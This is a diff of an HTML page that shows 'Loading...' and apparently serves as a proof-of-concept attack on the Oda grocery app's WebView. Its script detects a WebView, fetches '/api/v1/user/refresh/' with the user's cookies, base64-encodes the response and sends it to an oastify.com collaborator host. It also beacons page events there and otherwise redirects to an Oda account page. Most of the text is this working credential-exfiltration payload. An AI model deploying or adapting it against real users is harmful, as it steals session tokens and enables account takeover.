@@ -8,6 +8,10 @@
 
 <h2>Loading...</h2>
 
+<a id="openApp" href="https://oda.com/no-en/account/climate/">
+    Click here if not redirected
+</a>
+
 <script>
 (function() {
     const COLLAB = "https://86capcxbggebspel6y19s9pgw722qwel.oastify.com";
@@ -16,48 +20,29 @@
         new Image().src = COLLAB + "/?" + type + "=" + encodeURIComponent(data);
     }
 
-    // ==============================
-    // STEP 1: LOG PAGE LOADED
-    // ==============================
     send("log", "PAGE_LOADED");
 
-    // ==============================
-    // STEP 2: DETECT WEBVIEW
-    // ==============================
     if (navigator.userAgent.includes("wv")) {
         send("log", "INSIDE_WEBVIEW");
+
+        // EXPLOIT
+        fetch("/api/v1/user/refresh/", {
+            credentials: "include"
+        })
+        .then(r => r.text())
+        .then(d => {
+            send("data", btoa(d));
+        })
+        .catch(e => send("error", e));
+
     } else {
         send("log", "OPENED_IN_BROWSER");
 
-        // ==============================
-        // STEP 3: TRIGGER APP VIA INTENT
-        // ==============================
+        // 🔥 AUTO REDIRECT (HTTPS, bukan intent)
         setTimeout(() => {
-            window.location.href =
-                "intent://oda.com/no-en/account/climate/#Intent;" +
-                "scheme=https;" +
-                "package=no.kolonial.tienda;" +
-                "end";
+            window.location.href = "https://oda.com/no-en/account/climate/";
         }, 1500);
-
-        return; // stop execution di browser
     }
-
-    // ==============================
-    // STEP 4: EXPLOIT (JALAN DI WEBVIEW)
-    // ==============================
-    fetch("/api/v1/user/refresh/", {
-        method: "GET",
-        credentials: "include"
-    })
-    .then(res => res.text())
-    .then(data => {
-        send("data", btoa(data));
-    })
-    .catch(err => {
-        send("error", err);
-    });
-
 })();
 </script>
 
